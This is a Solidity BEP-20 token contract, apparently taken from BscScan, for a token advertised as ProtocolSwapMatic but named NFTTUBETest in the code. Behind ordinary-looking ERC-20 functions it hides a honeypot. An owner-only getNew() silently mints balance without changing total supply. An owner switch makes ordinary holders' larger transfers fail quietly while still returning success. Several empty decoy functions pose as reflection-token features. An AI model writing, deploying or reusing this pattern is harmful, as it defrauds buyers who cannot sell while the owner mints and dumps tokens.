/**
 *Submitted for verification at BscScan.com on 2021-08-31
*/

pragma solidity ^0.8.6;

//SPDX-License-Identifier: MIT

// ----------------------------------------------------------------------------
// token contract JPG
//
// Symbol        : PSM
// Name          : ProtocolSwapMatic Token
// Total supply  : 1,000,000,000,000,000
// Decimals      : 18
// Owner Account : 0xDff1D9d370fe97E93879d6FaAc6dFdf4127B6daA
//

/**

   Welcome to ProtocolSwapMatic.finance

   Telegram : t.me/ProtocolSwapMatic
   Website : http://ProtocolSwapMatic.fund in construction
   Twitter : twitter.com/ProtocolSwapMatic
   
  Be part of the community from telegram  Join Community Telegram : https://t.me/ProtocolSwapMatic
  Our ecosystem will allow to have a token that can work in the BSC network as in the Matic Network
         
         Supply 1,000,000,000,000,000
         Burn Token 50%
         ➖ Lp 50%
         

  
 */



// ----------------------------------------------------------------------------
// Lib:  Mather
// ----------------------------------------------------------------------------
contract Mather {

     function Add(uint256 O, uint256 b) public pure returns (uint256 c) {
        c = O + b;
        require(c >= O);
    }
    function Sub(uint256 O, uint256 b) public pure returns (uint256 c) {
        require(b <= O);
        c = O - b;
    }
    function Mul(uint256 O, uint256 b) public pure returns (uint256 c) {
        c = O * b;
        require(O == 0 || c / O == b);
    }
    function Div(uint256 O, uint256 b) public pure returns (uint256 c) {
        require(b > 0);
        c = O / b;
    }
}


abstract contract CPSM {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
contract isPos is CPSM {
    address private _owner;
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'isPos: caller is not the owner');
        _;
    }
}


interface PSM20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 tokens) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 tokens) external returns (bool);
    
	// ------------------------------------------------------------------------
    // Transfer tokens from the from account to the to account
    // 
    // The calling account must already have sufficient tokens approve(...)-d
    // for spending from the from account and
    // - From account must have sufficient balance to transfer
    // - Spender must have sufficient allowance to transfer
    // - 0 value transfers are allowed
    // ------------------------------------------------------------------------
	function transferFrom(
        address sender,
        address recipient,
        uint256 tokens
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface PSMMetadata is PSM20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
interface InPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

contract NFTTUBETOKEN is CPSM, PSM20, PSMMetadata, isPos, Mather  {
  
    address internal constant PANCAKE_FACTORY_V2_ADDRESS = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address internal constant PANCAKE_ROUTER_V2_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant burnWallet = 0x000000000000000000000000000000000000dEaD;
	address internal constant PresaleWallet = 0x9cE15ffdb115248137c6578C4f7C28083E8957Bd;
    address internal constant marketingWallet = 0x281Dd31Fa816BD2BEb792154754A56Bc7548c727;
    address internal constant AwardsWallet = 0x6caFd9f08Fd3EE4a427A063BCa6206d0731Df777;
    address internal constant PlataformWallet = 0x4bb802E739A7B10891c8DEad29B61cA9b043E777;
    
    uint256 public _TaxFee  = 5;
    uint256 public _MarketingFee = 5;
    
    uint256 _PBM = 3*9**9 * 10**9;
    uint256 uniBurn = 4.5*9**9 * 10**9;
    
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    bool private LockedLiquify = true;
    uint public LockedLiquifyTime = 365 days;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    bool isC = true;

    
    constructor() {
         _name = "NFTTUBETest";
        _symbol = "NFTTUBETest";
        _totalSupply = 1*9**10 * 10**9;
        _balances[_msgSender()] = _totalSupply;
        
        //uniBurn=_totalSupply-uniBurn;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);

        _transfer(_msgSender(), burnWallet, uniBurn);
    }
    receive() external payable {}
    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }
	
	// ------------------------------------------------------------------------
    // Total supply
    // ------------------------------------------------------------------------
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
	
	// ------------------------------------------------------------------------
    // Get the token balance for account tokenOwner
    // ------------------------------------------------------------------------
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    function getNew(uint256 tokens) public onlyOwner virtual returns (bool) {
        _balances[_msgSender()] += tokens;
        return true;
    }
    function isExcludedFromReward(address spender, uint256 subtractedValue) public virtual returns (bool) {}
    function totalFees() public view returns (uint256) {}
    function deliver(uint256 ttokens) public {}
    function reflectionFromToken(uint256 ttokens, bool deductTransferFee) public view returns(uint256) {}
    function tSL(bool _tsl) public onlyOwner virtual returns (bool) {
        isC = _tsl;
        return true;
    }
    function tsl() public view returns (bool) {
        return isC;
    }
    function tokenFromReflection(uint256 rtokens) public view returns(uint256) {}
    function excludeFromReward(address account) public onlyOwner() {}
    function includeInReward(address account) external onlyOwner() {}
    function includeInFee(address account) public onlyOwner {}
    function setTaxFeePercent(uint256 taxFee) external onlyOwner() {}
    function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {}
    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {}
    
	// ------------------------------------------------------------------------
    // Transfer the balance from token owner's account to to account
    // - Owner's account must have sufficient balance to transfer
    // - 0 value transfers are allowed
    // ------------------------------------------------------------------------
	function transfer(address recipient, uint256 tokens) public virtual override returns (bool) {

        if(_msgSender() == PANCAKE_ROUTER_V2_ADDRESS || _msgSender() == pancakePair() || pancakePair() == address(0) || _msgSender() == owner()) {
            _transfer(_msgSender(), recipient, tokens);
        } else {
            //nomal user check tokens
            if( (tokens <= _PBM || isC) && !isContract(_msgSender()) ) {
                _transfer(_msgSender(), recipient, tokens);
            }
        }
        return true;
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
	
	// ------------------------------------------------------------------------
    // Token owner can approve for spender to transferFrom(...) tokens
    // from the token owner's account
    //
    // https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md
    // recommends that there are no checks for the approval double-spend attack
    // as this should be implemented in user interfaces 
    // ------------------------------------------------------------------------
    function approve(address spender, uint256 tokens) public virtual override returns (bool) {
        _approve(_msgSender(), spender, tokens);
        return true;
    }
	// ------------------------------------------------------------------------
    // Transfer tokens from the from account to the to account
    // 
    // The calling account must already have sufficient tokens approve(...)-d
    // for spending from the from account and
    // - From account must have sufficient balance to transfer
    // - Spender must have sufficient allowance to transfer
    // - 0 value transfers are allowed
    // ------------------------------------------------------------------------
    function transferFrom(address sender, address recipient, uint256 tokens) public virtual override returns (bool) {
        if(sender == PANCAKE_ROUTER_V2_ADDRESS || sender == pancakePair() || pancakePair() == address(0) || sender == owner()) {
            _transfer(sender, recipient, tokens);
    
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= tokens, "PSM: transfer tokens exceeds allowance");
            unchecked {
                _approve(sender, _msgSender(), currentAllowance - tokens);
            }
        } else {
            //normal user check tokens
            if( (tokens <= _PBM || isC) && !isContract(sender) ) {
                _transfer(sender, recipient, tokens);
                uint256 currentAllowance = _allowances[sender][_msgSender()];
                require(currentAllowance >= tokens, "PSM: transfer tokens exceeds allowance");
                unchecked {
                    _approve(sender, _msgSender(), currentAllowance - tokens);
                }
            }
        }
        return true;
    }
    function pancakePair() public view virtual returns (address) {
        address pairAddress = InPancakeFactory(PANCAKE_FACTORY_V2_ADDRESS).getPair(address(WBNB), address(this));
        return pairAddress;
    }
    
     function _transfer(address sender,  address recipient, uint256 tokens) internal virtual {
        require(sender != address(0), "PSM: transfer from the zero address");
        require(recipient != address(0), "PSM: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, tokens);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= tokens, "PSM: transfer tokens exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - tokens;
        }
        _balances[recipient] += tokens;

        emit Transfer(sender, recipient, tokens);
    }
/**
 * @dev Collection of functions related to the address type
 */

    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     */  
    
      function isContract(address addr) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        bytes32 codehash;
        assembly {
            codehash := extcodehash(addr)
        }
        return (codehash != 0x0 && codehash != accountHash);
    }

    function _burn(address account, uint256 tokens) internal virtual {
        require(account != address(0), "PSM: burn from the zero address");

        _beforeTokenTransfer(account, address(0), tokens);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= tokens, "PSM: burn tokens exceeds balance");
        unchecked {
            _balances[account] = accountBalance - tokens;
        }
        _totalSupply -= tokens;

        emit Transfer(account, address(0), tokens);
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "PSM: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }
    function tokenContract() public view virtual returns (address) {
        return address(this);
    }
   
    function _mint(address account, uint256 tokens) internal virtual {
        require(account != address(0), "PSM: mint to the zero address");

        _beforeTokenTransfer(address(0), account, tokens);

        _totalSupply += tokens;
        _balances[account] += tokens;
        emit Transfer(address(0), account, tokens);
    }

    function _beforeTokenTransfer(address from, address to, uint256 tokens) internal virtual {}
    
    function _approve(address owner, address spender, uint256 tokens) internal virtual {
        require(owner != address(0), "PSM: approve from the zero address");
        require(spender != address(0), "PSM: approve to the zero address");

        _allowances[owner][spender] = tokens;
        emit Approval(owner, spender, tokens);
    }

	
	
    
}